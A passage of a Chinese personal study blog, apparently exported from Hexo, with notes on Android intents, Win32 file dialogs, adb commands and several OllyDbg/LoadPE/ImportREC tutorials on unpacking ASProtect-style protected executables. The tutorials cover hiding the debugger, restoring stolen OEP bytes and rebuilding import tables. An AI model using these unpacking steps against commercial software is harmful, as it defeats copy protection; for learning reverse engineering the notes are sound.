&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大部分不是太重要，关键的就是我们的看：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Button btn_test;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_main);</span><br><span class="line">		btn_test = (Button) findViewById(R.id.btn_OpenActivity);</span><br><span class="line">		btn_test.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">				intent.setClass(MainActivity.<span class="keyword">this</span>, activity<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//packageContext上下文</span></span><br><span class="line">				startActivity(intent);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这一段代码使我们的关键，首先我定义了一个private权限的button，然后我们用<code>findviewById</code>这个函数进行关联，还是用到了R文件下的全局ID，然后进行了强制转换，关联之后我们设置一个监听器，new一个就好，不要用this那种方法，反正我不是很喜欢，那种写法让我想起了Win32繁杂的switch case语句，很烦的，题外话。然后我们在那个消息器中new一个Intent，然后将我们的Intent设置一下Class，setClass这个方法其实我也不是很明白，但是看样子就是讲我们的一个上下文对象关联到一个类上面，网上看了一下介绍：</p>
<ul>
<li>intent.setClass(目前的acitivy.this, 目标activity.class);<br>应该就是这个样子的一个意思，然后我们startActivity就可以了。最后的效果：<br><img src="img1.gif" alt="实现效果"><br>记录一下东西，Ctrl+shift+/这个就可以进行快速注释，Alt+/就可以快速联想。<br>扩展：match_parent:是layout_width和layout_height的属性值之一，表示和父组件一样的长度。<br>这些Activity是以栈的形式在内存中保存的，这个动脑子想一下也就知道了。</li>
</ul>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>通用对话框</title>
    <url>/2020/01/19/%E9%80%9A%E7%94%A8%E5%AF%B9%E8%AF%9D%E6%A1%86/</url>
    <content><![CDATA[<h1 id="通用对话框"><a href="#通用对话框" class="headerlink" title="通用对话框"></a>通用对话框</h1><p>通用对话框其实还是比较常用的，这里主要分为获取文件目录和获取文件夹目录两种对话框形式，并且获取文件目录的对话框还分为打开文件和写入文件两种对话框形式。</p>
<h2 id="获取文件目录"><a href="#获取文件目录" class="headerlink" title="获取文件目录"></a>获取文件目录</h2><p>这个相对而言是比较简单的，主要的牵扯到GetOpenFileName()和GetSaveFileName()这两个函数，这两个函数需要一个同样的参数，这个参数也就是一个OPENFILENAME类型的指针，这个类型在MSDN中的定义：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOFN</span> &#123;</span> <span class="comment">// ofn </span></span><br><span class="line">    DWORD         lStructSize; </span><br><span class="line">    HWND          hwndOwner; </span><br><span class="line">    HINSTANCE     hInstance; </span><br><span class="line">    LPCTSTR       lpstrFilter; </span><br><span class="line">    LPTSTR        lpstrCustomFilter; </span><br><span class="line">    DWORD         nMaxCustFilter; </span><br><span class="line">    DWORD         nFilterIndex; </span><br><span class="line">    LPTSTR        lpstrFile; </span><br><span class="line">    DWORD         nMaxFile; </span><br><span class="line">    LPTSTR        lpstrFileTitle; </span><br><span class="line">    DWORD         nMaxFileTitle; </span><br><span class="line">    LPCTSTR       lpstrInitialDir; </span><br><span class="line">    LPCTSTR       lpstrTitle; </span><br><span class="line">    DWORD         Flags; </span><br><span class="line">    WORD          nFileOffset; </span><br><span class="line">    WORD          nFileExtension; </span><br><span class="line">    LPCTSTR       lpstrDefExt; </span><br><span class="line">    DWORD         lCustData; </span><br><span class="line">    LPOFNHOOKPROC lpfnHook; </span><br><span class="line">    LPCTSTR       lpTemplateName; </span><br><span class="line">&#125; OPENFILENAME;</span><br></pre></td></tr></table></figure>
<p>这里面比较重要的也就是</p>
<ul>
<li>lpstrFile</li>
<li>nMaxFile</li>
<li>lpstrFilter</li>
<li>nFilterIndex<br>这四个字段比较重要，第一个保存我们文件目录的一个char类型指针变量，NMaxFile应该是一个最大长度的限制，这里我们用MAX_PATH这个就可以了。lpstrFilter这个是过滤器的一个字符串，\0代表一个结束，支持正则，\0\0代表过滤器终止。nFilterIndex过滤器首选第几个。<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//示例代码：</span></span><br><span class="line">	<span class="keyword">char</span> szFileName[MAX_PATH] = <span class="string">""</span>;</span><br><span class="line">	OPENFILENAME file = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	file.lStructSize = <span class="keyword">sizeof</span>(file);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//设置对话框的属性</span></span><br><span class="line">	file.lpstrFile = szFileName;</span><br><span class="line">	file.nMaxFile = MAX_PATH;</span><br><span class="line">	file.lpstrFilter = <span class="string">"Text Files(*.txt)\0*.txt\0All Files\0*.*\0\0"</span>;<span class="comment">//最后的兩個\0是代表結束</span></span><br><span class="line">	file.nFilterIndex = <span class="number">1</span>; <span class="comment">//這個應該是代表哪個過濾器顯示在第一個得把。</span></span><br><span class="line">	<span class="keyword">if</span> (GetOpenFileName(&amp;file))<span class="comment">//GetSaveFileName這個是用來保存文件的，參數一樣，返回值代表了我們點擊的是不是確定</span></span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>,szFileName,<span class="string">"打開的文件"</span>,MB_OK);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
不要忘记导入Windows.h这个头文件，【GetSaveFileName类似】。<h2 id="获取文件夹目录"><a href="#获取文件夹目录" class="headerlink" title="获取文件夹目录"></a>获取文件夹目录</h2>这个就稍微有一点点麻烦，所以我们写一个类，支持我们以后进行编写：<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __DIRDIALOG_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __DIRDIALOG_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ShlObj.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CDirDialog</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CDirDialog();</span><br><span class="line">	<span class="function">BOOL <span class="title">DoBrowse</span><span class="params">(HWND hWndParent,LPCTSTR pszTitle = <span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	<span class="function">LPCTSTR <span class="title">GetDirPath</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> m_szPath;&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	BROWSEINFOA m_bi;</span><br><span class="line">	<span class="comment">//用來接收用戶選擇目錄的緩衝區</span></span><br><span class="line">	<span class="keyword">char</span> m_szPath[MAX_PATH];</span><br><span class="line">	<span class="keyword">char</span> m_szDisplay[MAX_PATH];</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&#125;;</span><br><span class="line">CDirDialog::CDirDialog()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;m_bi,<span class="number">0</span>,<span class="keyword">sizeof</span>(m_bi));<span class="comment">//先清空一下這個變量</span></span><br><span class="line">	m_bi.hwndOwner = <span class="literal">NULL</span>;<span class="comment">//對話框父窗口</span></span><br><span class="line">	m_bi.pidlRoot = <span class="literal">NULL</span>;<span class="comment">//用來接收起始目錄的那個結構</span></span><br><span class="line">	m_bi.pszDisplayName = m_szDisplay;<span class="comment">//接受緩衝區的</span></span><br><span class="line">	m_bi.lpszTitle = <span class="literal">NULL</span>;<span class="comment">//對話框中定義的文字</span></span><br><span class="line">	m_bi.ulFlags = BIF_RETURNONLYFSDIRS;<span class="comment">//我們只接受文件系統中的目錄</span></span><br><span class="line">	m_szPath[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL CDirDialog::DoBrowse(HWND hWndParent,LPCTSTR pszTitle)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(pszTitle == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		m_bi.lpszTitle = <span class="string">"選擇目標文件夾"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		m_bi.lpszTitle = pszTitle;</span><br><span class="line">	&#125;</span><br><span class="line">	m_bi.hwndOwner = hWndParent;</span><br><span class="line">	LPITEMIDLIST pItem = SHBrowseForFolder(&amp;m_bi);</span><br><span class="line">	<span class="keyword">if</span> (pItem !=<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		SHGetPathFromIDList(pItem,m_szPath);</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//__DIRDIALOG_H__結束</span></span></span><br></pre></td></tr></table></figure>
简单说明一下SHGetPathFromIDList这个函数，LPITEMIDLIST这个结构体比较复杂，但是我们通过这个函数我们就可以简单的获取到我们输入的内容。<br>如果我们要用的话呢我们只需要<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CDirDialog.h"</span></span></span><br><span class="line">CDirDialog dir;</span><br><span class="line"><span class="keyword">if</span>(dir.DoBrowse(<span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>,dir.GetDirPath(),<span class="string">"打開的文件"</span>,MB_OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这样就可以打开一个文件目录了。</li>
</ul>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>adb-Common-method</title>
    <url>/2020/01/18/adb-Common-method/</url>
    <content><![CDATA[<p>初学Android</p>
<h1 id="ADB常用命令"><a href="#ADB常用命令" class="headerlink" title="ADB常用命令"></a>ADB常用命令</h1><ul>
<li>adb devices<br>这个用于查看当前连接的模拟器。<br><img src="img1.jpg" alt="查看当前连接对象"></li>
<li>adb start-server <strong>开启调试器</strong></li>
<li>adb kill-server  <strong>终止调试器</strong></li>
<li>adb -s 参数 install 路径 <strong>安装一个apk文件</strong> 参数适用于指定安装的路径</li>
<li>adb shell 获取Android的Shell <strong>这个命令有点类似于Linux的命令，且当前目录是我们的根目录</strong><br><img src="img2.jpg" alt="Shell权限"><blockquote>
<p>在这里我刚了解到，原来Android的内核是基于Linux的。<br>exit 退出当前的Shell</p>
</blockquote>
</li>
<li>adb push &lt;Windows的一个文件&gt;&lt;手机文件目录&gt; <strong>主要用来传给我们手机电脑上的一个文件</strong><br>但是如果你遇到：<em>Unable to chmod ***: Read-only file system</em><br>那么解决办法：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">首先我们需要adb切换到root权限：adb remount</span><br><span class="line">然后我们重新挂载：mount -rw -o remount &#x2F;</span><br><span class="line"></span><br><span class="line">	注：</span><br><span class="line">  	mount 是挂载命令</span><br><span class="line">  	-rw  是说指定的挂载文件是可读&#x2F;写的</span><br><span class="line"> 	-o remount &#x2F; 是说重新挂载根</span><br><span class="line">然后我们chmod 777 文件夹</span><br><span class="line">777就是可读可写，具体忘记了，Linux的一些操作过短时间需要复习了看来。</span><br></pre></td></tr></table></figure>
<img src="img3.jpg" alt="重新挂载"><br><img src="img4.jpg" alt="赋予权限"></li>
<li>adb pull &lt;手机文件&gt;&lt;Windows文件路径&gt;</li>
<li>Ctrl+F11横竖屏切换（现在貌似废弃了，在…中有）。</li>
</ul>
<p>上述的许多命令用eclipse基本可以代替，所一这里不过多的赘述。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>NewSectionFindLoseData</title>
    <url>/2020/01/18/NewSectionFindLoseData/</url>
    <content><![CDATA[<h1 id="包含壳的脱壳"><a href="#包含壳的脱壳" class="headerlink" title="包含壳的脱壳"></a>包含壳的脱壳</h1><p>有的时候我们丢失的数据过多，如果我们要找到我们所有丢失的数据基本上是不是太可能的，这个时候我们将壳的一部分包含在程序当中，当不需要做太大的动作的时候，我们的这种做法还是可以的，具体操作如下：</p>
<h2 id="AsProtect找丢失的数据区段"><a href="#AsProtect找丢失的数据区段" class="headerlink" title="AsProtect找丢失的数据区段"></a>AsProtect找丢失的数据区段</h2><p>首先我们先找到我们假的OEP，这个壳子我们还是用最后一次异常法：我们先隐藏OD，其实可以用OD插件的options设置开启自动隐藏（小技巧），这个时候我们设置我们的异常为：<br><img src="img1.jpg" alt="异常设置"><br>然后我们用最后一次异常法（shift+F9），这里一共是27次，在26次的时候我们我们调节我们的异常这个地方我不知道其他人为啥可以，但我就是不可以，我们这个时候将我们的异常调节为：<br><img src="img2.jpg" alt="异常设置"><br>然后我们在最近的一个retn下端，然后执行过去：<br><img src="img3.jpg" alt="retn处"><br>这个时候注意看我在堆栈处的箭头，在这个地方下硬件下硬件写入断点（具体原因只有当时研究的人知道），然后我们的程序会跑到一个jmp处，我们删除硬件写入断点，然后往下跟句，然后我们当前的位置：<br><img src="img4.jpg" alt="适合找数据的位置"><br>塑这个位置使我们比较合适的找数据的位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00CC696F    BB A2000000     MOV EBX,0A2</span><br><span class="line">00CC6974    0BDB            OR EBX,EBX</span><br><span class="line">00CC6976    75 07           JNZ SHORT 00CC697F</span><br><span class="line">00CC6978    894424 1C       MOV DWORD PTR SS:[ESP+1C],EAX</span><br><span class="line">00CC697C    61              POPAD</span><br><span class="line">00CC697D    50              PUSH EAX</span><br><span class="line">00CC697E    C3              RETN</span><br><span class="line">00CC697F    E8 00000000     CALL 00CC6984</span><br><span class="line">00CC6984    5D              POP EBP</span><br></pre></td></tr></table></figure>
<p>然后我们用我们的LoadPE进行脱壳：<br>在这里我们先纠正镜像大小，然后完全转存。<br>下面比较重要，注意看我们需要区域转存：<br><img src="img5.jpg" alt="区域转存"><br><img src="img6.jpg" alt="区域转存"><br>注意我们选择的区段要包含我们刚才停留的位置：这个时候我们使用LoadPE给我们的PE编辑器，打开文件，点击编辑区段：<br><img src="img7.jpg" alt="区段编辑"><br><img src="img8.jpg" alt="区段编辑"><br>导入我们刚才的区段。<br><img src="img9.jpg" alt="计算区段"><br>这里我们用我们当前的位置减去我们的基址（也就是400000），得到我们的虚拟地址，然后我们保存一下。<br>这个时候我们重建PE，但在重建之前我们需要设置：<br><img src="img10.jpg" alt="重建PE"><br>只留下验证PE就好了，我们重建确定。</p>
<h2 id="AsProtect找假OEP"><a href="#AsProtect找假OEP" class="headerlink" title="AsProtect找假OEP"></a>AsProtect找假OEP</h2><p>然后我们找我们假的OEP，这个地方我们很简单，我们在我们的code断下内存访问中断，然后我们运行，运行到这个地方：<br><img src="img11.jpg" alt="假OEP"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004F27CF    FF15 9CC25200   CALL DWORD PTR DS:[52C29C]</span><br><span class="line">004F27D5    33D2            XOR EDX,EDX</span><br><span class="line">004F27D7    8AD4            MOV DL,AH</span><br><span class="line">004F27D9    8915 34306900   MOV DWORD PTR DS:[693034],EDX</span><br><span class="line">004F27DF    8BC8            MOV ECX,EAX</span><br><span class="line">004F27E1    81E1 FF000000   AND ECX,0FF</span><br><span class="line">004F27E7    890D 30306900   MOV DWORD PTR DS:[693030],ECX</span><br><span class="line">004F27ED    C1E1 08         SHL ECX,8</span><br><span class="line">004F27F0    03CA            ADD ECX,EDX</span><br><span class="line">004F27F2    890D 2C306900   MOV DWORD PTR DS:[69302C],ECX</span><br></pre></td></tr></table></figure>
<p>我们这个时候重建输入表，import REC我们填写我们的假OEP，然后查找：<br><img src="img12.jpg" alt="重建IAT"><br>我们用等级一修复，还剩下六个，我们用ASProcet的插件进行搜索，最后得到的结果：<br><img src="img13.jpg" alt="重建IAT"><br>我们全部都找到了。<br>我们修改我们的OEP，修改为我们的假OEP地址的相对地址：0x00CC696F-0x00400000=0x008C696F<br><img src="img14.jpg" alt="修改OEP"><br>然后抓取修复就可以了。<br><strong>PS：但在这个地方，我却没有成功，不知道为什么。但是操作确实是这个样子的，可能是OD的版本不同，或者我查看的这个程序是在是太老了的原因，这也算是给自己留下的一个疑惑吧，脱壳学习，先暂停一下，是时候复习一下Win32了！</strong></p>
]]></content>
      <categories>
        <category>脱壳篇</category>
      </categories>
      <tags>
        <tag>脱壳篇</tag>
      </tags>
  </entry>
  <entry>
    <title>LoseData-find</title>
    <url>/2020/01/17/LoseData-find/</url>
    <content><![CDATA[<h1 id="丢失的程序头部"><a href="#丢失的程序头部" class="headerlink" title="丢失的程序头部"></a>丢失的程序头部</h1><p>有的程序加壳之后将原本OEP的部分头部给去除掉了，放在了自身的壳里面，导致我们脱壳之后我们的程序可能入口会出错，这个时候我们就需要自己补充上去：</p>
<h2 id="丢失数据的OEP"><a href="#丢失数据的OEP" class="headerlink" title="丢失数据的OEP"></a>丢失数据的OEP</h2><p>首先我们需要找到他给我们的OEP，这里ACProcet这个壳比较特殊，我们需要用插件HideOD进行隐藏，然后将我们的调试选项，取消勾选INT3的异常：<br><img src="img1.jpg" alt="调试设置"><br><img src="img2.jpg" alt="隐藏OD"><br>这个时候我们运行程序，使用最后一次异常，将我们的SE栈值下上硬件断点，这里为什么不下INT3断点呢，其实是这个壳有一定的保护系统，下上会出错（别人说的），然后我们的程序会进入下面这个地方：<br><img src="img3.jpg" alt="关键处"><br>这个时候我们看到RETN就到了我们的假的OEP，这个时候我们运行到RETN，然后对我们的code代码段进行下访问断点：<br><img src="img4.jpg" alt="返回处"><br><img src="img5.jpg" alt="访问中断"><br>这个时候运行程序，我们的程序就会到假的OEP：<br><img src="img6.jpg" alt="丢失数据的OEP"><br>这个时候我们知道之后，其实已经错过了找我们的丢失数据的机会，我们重新来过：<br>在我们下断在RETN的时候我们下12ffc0这个硬件访问断点，<br><img src="img7.jpg" alt="硬件断点"><br>然后他会带我们跳到：<br><img src="img8.jpg" alt="丢失的数据"><br>我们复制二进制数据，然后相同的方法到达我们刚才的OEP，把那一段给粘贴上去：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">55 8B EC 6A FF</span><br></pre></td></tr></table></figure>
<p>我们找到假的OEP其实有个坑，程序代码会混淆，这个时候我们Ctrl+A分析代码就好了，然后在上面5个字节粘贴我们的二进制：<br><img src="img9.jpg" alt="补充数据"><br>这个时候我们将我们当前的EIP进行转到我们的补充好的数据上面，然后进行脱壳：<br><img src="img10.jpg" alt="修改EIP"><br>这个时候我们打开LoadPE，修改我们的镜像，然后拖出来，之后的操作和我们之前的都是一样的（import REC需要修复数据），然后生成我们的脱壳程序。<br>但是我们发现我们的程序还是没办法运行起来。这里别人说应该是保护的一个机制：<br><img src="img11.jpg" alt="启动失败"><br>我们去到我们没有脱壳前程序的OEP，然后将我们的一些丢失数据放回去这个样子他就检测不出来了。<br><img src="img12.jpg" alt="原先OEP"><br>入口的OEP是AC000，我们跳过去，把我们的二进制数据粘贴上去，然后用jmp跳转跳转到我们的真正的OEP：<br><img src="img13.jpg" alt="假OEP"><br>修改完毕之后我们保存（OD自带的保存修改），但是这个时候还是不行，因为我们现在PE头部的OEP还是我们真正的OEP，我们用LoadPE指过去：<br><img src="img14.jpg" alt="修改入口点地址"><br>我们点击保存，确定就好了，但是我们发现我们PEid还是找不到壳子，这个就是后话了。</p>
]]></content>
      <categories>
        <category>脱壳篇</category>
      </categories>
      <tags>
        <tag>脱壳篇</tag>
      </tags>
  </entry>
  <entry>
    <title>OverLay-UnShell</title>
    <url>/2020/01/16/OverLay-UnShell/</url>
    <content><![CDATA[<p>当我们在查壳的时候碰到覆盖（OverLay）的时候，我们就需要如下操作：<br><img src="img10.jpg" alt="查壳"></p>
<h1 id="OverLay数据处理"><a href="#OverLay数据处理" class="headerlink" title="OverLay数据处理"></a>OverLay数据处理</h1><p>今天刚学习了这种数据处理的方法，具体原因之后深入分析，其实也就是区段数据的一个补充，首先需要找到我们的多余数据，分为两种简单方法：</p>
<h2 id="数据查找法"><a href="#数据查找法" class="headerlink" title="数据查找法"></a>数据查找法</h2><p>这种方法比较简单也比较直接，我们从最底部自下往上寻找一大片00，用快捷键就可以了，记住是搜索没有脱壳的数据：<br><img src="img1.jpg" alt="查找方法"><br><img src="img2.jpg" alt="结果数据"><br>我们从00后面的数据复制，最好用shift范围性复制，复制到结尾。<br><img src="img3.jpg" alt="复制数据"></p>
<h2 id="区段查找法"><a href="#区段查找法" class="headerlink" title="区段查找法"></a>区段查找法</h2><p>这个通过LoadPE查找最后的一个区段的范围，然后通过真实的RVA+Size计算出来我们要找的数据：<br><img src="img4.jpg" alt="PE计算"><br>8800+400=8C00，我们这里Ctrl+G进行转到，然后看到和我们刚才一样的地方，同样复制。<br><img src="img5.jpg" alt="地址转到"></p>
<h1 id="修复数据"><a href="#修复数据" class="headerlink" title="修复数据"></a>修复数据</h1><p>复制完毕之后我们打开我们脱壳完毕的程序，然后拖到底部，然后将我们刚才的数据复制上去。<br><img src="img6.jpg" alt="粘贴数据"><br>粘贴上去会询问我们，我们点击确定就好了：<br><img src="img7.jpg" alt="确定"><br>之后我们就会看到数据变成这个样子的：<br><img src="img8.jpg" alt="修改的数据"><br>我们Ctrl+S保存，然后用PEid进行查壳：<br><img src="img9.jpg" alt="查壳"><br>我们发现我们的程序脱壳完毕，并且后面还有一个“[覆盖]”，运行也正常这个样子就算是可以了的。</p>
]]></content>
      <categories>
        <category>脱壳篇</category>
      </categories>
      <tags>
        <tag>脱壳篇</tag>
      </tags>
  </entry>
  <entry>
    <title>IF-UnShell</title>
    <url>/2020/01/16/IF-UnShell/</url>
    <content><![CDATA[<h2 id="快捷判断找OEP"><a href="#快捷判断找OEP" class="headerlink" title="快捷判断找OEP"></a>快捷判断找OEP</h2><p>有的时候我们在脱壳的时候经常其实眼睛观察就能观察到OEP的位置（比较大的一个跨区段跳转），但是这个时候我们的跳转并没有实现，原因有很多，比较典型的原因就是我们的输入表重新构建的工作并没有完成，所以紧跟其后的就是我们的输入表重建工作，比较典型的就是下面这段代码：<br><img src="img1.jpg" alt="关键跳"><br>我们来看这句，这么多字节，很明显的啊，就是一个跨区段的跳转，但是我们发现这个时候我们并没有跳转实现，我们先转过去，发现确实是OEP，但是我们dump修复的时候我们发现我们发现不了任何一个输入表，这就对了，<strong>下面的这一下跳转其实就是我们的输入表重建工作，比较明显的就是我们的我们寄存器中会出现输入表的一些信息</strong>：<br><img src="img2.jpg" alt="关键跳"><br>这个时候我们要注意了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0043E633    09C0            or eax,eax                               ; 跑跑排行.0043E746</span><br><span class="line">0043E635  - 0F84 E3BDFCFF   je 跑跑排行.0040A41E</span><br></pre></td></tr></table></figure>
<p>我们可以看到，只有只有在我们的eax的值为0的时候我们的跳转才会实现，这个时候OD提供给了我们一个很强大的功能就是跳转断点，我们设置只有在eax==0的时候才会停下来就好了，具体操作如下：<br><img src="img3.jpg" alt="条件断点"><br>键入我们的条件：eax==0<br><img src="img4.jpg" alt="条件"><br>然后我们运行程序：<br><img src="img5.jpg" alt="断下"><br>这个时候我们跟过去就是我们的OEP了。</p>
]]></content>
      <categories>
        <category>脱壳篇</category>
      </categories>
      <tags>
        <tag>脱壳篇</tag>
      </tags>
  </entry>
  <entry>
    <title>special-UnShell</title>
    <url>/2020/01/16/special-UnShell/</url>
    <content><![CDATA[<h2 id="是否正在调试法"><a href="#是否正在调试法" class="headerlink" title="是否正在调试法"></a>是否正在调试法</h2><p>有的时候一些壳会有防止调试的检测，这个时候我们就可以下：IsDebuggerPresent这个断点，然后返回到用户组，下面应该就有OEP的一些运算了，手下我们先下断点：<br><img src="img1.jpg" alt="下断点"><br>然后我们执行到程序领空：<br>我们看到了下面这几句话：<br><img src="img2.jpg" alt="OEP计算"><br>这个时候我们执行完这两句，我们看edi的值：<br><img src="img3.jpg" alt="EDI"><br>这个时候我们转到EDI的这个地址：<br><img src="img4.jpg" alt="OEP"><br>这个时候F4运行到就好了！</p>
]]></content>
      <categories>
        <category>脱壳篇</category>
      </categories>
      <tags>
        <tag>脱壳篇</tag>
      </tags>
  </entry>
  <entry>
    <title>track API</title>
    <url>/2020/01/16/track-API/</url>
    <content><![CDATA[<h2 id="一个文件修复"><a href="#一个文件修复" class="headerlink" title="一个文件修复"></a>一个文件修复</h2><p>import REC跟踪无效的函数，这样我们才能够准确无误的删除一些真正无效的函数，我们首先先找到程序的OEP，这里最后一次异常法就可以到达：<br><img src="img1.jpg" alt="OEP"><br>这个时候我们dump出来，运行的时候发现：<br><img src="img2.jpg" alt="错误"><br>这个时候我们用import REC进行修复，常规操作，我们转储的文件中，但是我们发现还是会出来相同的问题，那么我们该如何办呢？</p>
<h2 id="跟踪出真正的函数地址"><a href="#跟踪出真正的函数地址" class="headerlink" title="跟踪出真正的函数地址"></a>跟踪出真正的函数地址</h2><p>我们首先搜索出函数的输入表（这里验证过了）：<br>然后我们显示出无效的函数：<br><img src="img3.jpg" alt="无效函数"><br>这个时候我们不要急着去删除他，我们先右键跟踪这几个函数地址，看看能不能跟踪出真正的函数地址：<br><img src="img4.jpg" alt="跟踪函数"><br>然后挨个尝试，发现第一二个都是无法看到的，但是我们用到第三个的时候，我们发现import REC卡死了，这个时候，我们就需要打开新的需要脱壳的程序，然后重新加载，然后我们跟踪函数，和上面的操作一样，这个时候import REC会给我们一个结果：<br><img src="img5.jpg" alt="跟踪结果"><br>我们可以看到import REC给了我们结果，不仅给了我们地址，还给了我们的函数名，但是不知道是不是bug，我在跟踪的时候待脱壳程序自动关闭了，但是这个不影响，然后我们发现还有5个无法修复，那么没办法我们尝试着去删除他们（在这里有个坑，不知道是不是这个程序的bug，我们点击删除不行，只能点击那个剪切），完事之后我们修复抓取文件，导出就会发现程序脱壳完毕了：<br><img src="img6.jpg" alt="脱壳完毕"></p>
]]></content>
      <categories>
        <category>脱壳篇</category>
      </categories>
      <tags>
        <tag>脱壳篇</tag>
      </tags>
  </entry>
  <entry>
    <title>Rebuilt input list2</title>
    <url>/2020/01/16/Rebuilt-input-list2/</url>
    <content><![CDATA[<p>今天记录一下，再重新构建PE表的时候出现问题实时的解决办法，这是一个EZIP的壳，我们很简单的就到了我们的OEP：<br><img src="img1.jpg" alt="OEP"><br>然后我们进行dump文件，首先我们用OD自带的插件进行dump。<br>然后运行dump出来的文件，会出现出错的问题：<br><img src="img2.jpg" alt="错误"><br>解决办法如下：</p>
<h2 id="LoadPE纠正镜像"><a href="#LoadPE纠正镜像" class="headerlink" title="LoadPE纠正镜像"></a>LoadPE纠正镜像</h2><p><img src="img3.jpg" alt="纠正镜像"></p>
<h2 id="import-REC修复转储文件"><a href="#import-REC修复转储文件" class="headerlink" title="import REC修复转储文件"></a>import REC修复转储文件</h2><p>我们可以看到import REC已经正确的查找到了我们需要的东西<br><img src="img4.jpg" alt="修复转储文件"><br>我们接下来获取输入表，剪切输入表dump出来就好了。<br>但是我们发现我们又一次的出现之前的错误！<br><img src="img5.jpg" alt="再次出现错误"></p>
<h2 id="LoadPE重构PE结构"><a href="#LoadPE重构PE结构" class="headerlink" title="LoadPE重构PE结构"></a>LoadPE重构PE结构</h2><p>我们用LoadPE重新构建一下PE的结构，<br><img src="img6.jpg" alt="选择重建PE"><br>然后我们点击打开，会出现这样子的一个窗口：<br><img src="img7.jpg" alt="查看成功"><br>这个时候我们的程序就正常运行起来了。<br>并且壳子也就没有了，其实我们一开始不用OD自带的插件脱壳，用LoadPE去拖这个壳子，import REC去修复是遇不到这个问题的。</p>
]]></content>
      <categories>
        <category>脱壳篇</category>
      </categories>
      <tags>
        <tag>脱壳篇</tag>
      </tags>
  </entry>
  <entry>
    <title>Common-Unshell2</title>
    <url>/2020/01/14/Common-Unshell2/</url>
    <content><![CDATA[<h1 id="比较常用的脱壳技巧2"><a href="#比较常用的脱壳技巧2" class="headerlink" title="比较常用的脱壳技巧2"></a>比较常用的脱壳技巧2</h1><p>之前文章介绍了一些比较常见的，下面再介绍几种</p>
